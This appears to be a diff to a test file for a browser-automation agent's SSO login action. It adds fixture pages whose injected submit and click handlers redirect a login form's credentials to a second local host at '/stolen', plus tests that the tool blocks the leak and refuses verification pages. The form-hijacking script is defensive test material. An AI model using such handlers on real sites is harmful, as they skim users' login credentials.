@@ -190,7 +190,20 @@ def _pages(port, port2):
         "/code-only": ("text/html", b'<html><head><title>Check</title></head><body><a href="/other">Other</a>'
                                     b'<form method="post" action="/logged"><input name="code"><button>OK</button></form>'
                                     b'</body></html>'),
+        # round 8: an SSO login form whose own submit handler turns it into a GET to another host (after the
+        # checks); and one whose click handler does the same
+        "/sso-rewrite": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
+            "</form>", f"</form><script>document.forms[0].addEventListener('submit', function () {{ this.method = 'get'; "
+                       f"this.action = 'http://127.0.0.1:{port2}/stolen'; }});</script>").encode()),
+        "/sso-rewrite-click": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
+            "</form>", f"</form><script>document.getElementById('login').addEventListener('click', function () {{ "
+                       f"this.form.action = 'http://127.0.0.1:{port2}/stolen'; }});</script>").encode()),
     }
+
+
+# the second (foreign) origin; every request it gets is recorded (a request for /stolen is a leak)
+XPAGES = {"/xframe": ("text/html", XFRAME.encode())}
+XHITS: list = []
 
 
 def _serve(pages):
@@ -206,6 +219,8 @@ def _serve(pages):
 
         def do_GET(self):
             p = self.path.split("?")[0]
+            if pages is XPAGES:
+                XHITS.append(p)
             if p in pages:
                 ct, body = pages[p]
                 self._x(body, ct)
@@ -216,6 +231,8 @@ def _serve(pages):
             n = int(self.headers.get("content-length", 0))
             self.rfile.read(n)
             p = self.path.split("?")[0]
+            if pages is XPAGES:
+                XHITS.append(p)
             if p == "/code-step":
                 self._x(pages[p][1], "text/html")
             elif p in pages and p.startswith("/sso"):        # a failed login shows the login form again
@@ -231,7 +248,7 @@ def _serve(pages):
 @pytest.fixture(scope="module")
 def origins():
     """Two local origins: the second one makes the iframe on the landing page cross-origin."""
-    srv2 = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _serve({"/xframe": ("text/html", XFRAME.encode())}))
+    srv2 = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _serve(XPAGES))
     port2 = srv2.server_address[1]
     threading.Thread(target=srv2.serve_forever, daemon=True).start()
     pages: dict = {}
@@ -385,7 +402,7 @@ def test_wait_for_and_removed_actions(origins):
     sp = "tbsgen-test-misc"
     try:
         assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
-        for a, arg in (("screenshot", ""), ("click_xy", "10 10"), ("scroll", "down 400")):
+        for a, arg in (("screenshot", ""), ("click_xy", "10 10"), ("scroll", "down 400"), ("back", "")):
             r = _run(sp, a, arg)
             assert r["status"] == "refused" and r["error"] == "unknown action", r     # removed actions
         r = _run(sp, "wait_for", "url landing")
@@ -864,5 +881,42 @@ def test_round7_checks_run_in_the_evaluation_that_acts(origins):
         assert "verification" in res[3]["refused"], res
         assert res[4] == {"foreign": "127.0.0.1", "leaked": False, "ok": True}, res
         assert res[5] == {"refused": "the page left the SSO login domain", "stage": "pre"}, res
+    finally:
+        _finish(sp)
+
+
+def test_round8_sso_form_rewritten_by_its_own_handlers_is_never_sent(origins):
+    """Round 8: the checks and the press are one evaluation; a submit / click handler that turns the form into
+    a GET or points it at another host after the checks is caught right after the press: the navigation is
+    stopped before any request, and it counts as a failed login."""
+    for path in ("/sso-rewrite", "/sso-rewrite-click"):
+        sp = "tbsgen-test-sso-rw"
+        XHITS.clear()
+        try:
+            assert _run(sp, "open", origins[2] + path)["status"] == "ok"
+            r = _run(sp, "sso_login", sso_login=True)
+            assert r["sso_submitted"] is True and r["sso"] == "fail", (path, r)
+            time.sleep(2)
+            assert "/stolen" not in XHITS, (path, XHITS)
+            r = _run(sp, "look")
+            assert "/stolen" not in json.dumps(r) and r["page"]["url"].endswith(path), (path, r)
+        finally:
+            _finish(sp)
+
+
+def test_round8_sso_verification_page_is_not_submitted(origins):
+    sp = "tbsgen-test-r8-sso-ch"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
+        body = (f"const pageInfo = {_fn_src('pageInfo')};\nconst credScan = {_fn_src('credScan')};\n"
+                f"const ssoSubmit = {_fn_src('ssoSubmit')};\n"
+                "const t = await taskSpace(" + json.dumps(sp) + ");\nconst pg = (await t.pages())[0];\n"
+                "await pg.evaluate(() => { document.title = 'Just a moment...'; });\n"
+                "const r = await pg.evaluate(([f, s, pi]) => (new Function('return (' + f + ')')())([['sso.localhost'], true, s, pi, 'just a moment']),\n"
+                "  [ssoSubmit.toString(), credScan.toString(), pageInfo.toString()]);\n"
+                "console.log('R8 ' + JSON.stringify(r));\nprocess.exit(0);")
+        p = subprocess.run([EGO, "nodejs", body], capture_output=True, text=True, timeout=90)
+        line = next(x for x in (p.stdout + p.stderr).splitlines() if x.startswith("R8 "))
+        assert json.loads(line[3:]) == {"refused": "verification page on the SSO login page", "stage": "pre"}, line
     finally:
         _finish(sp)
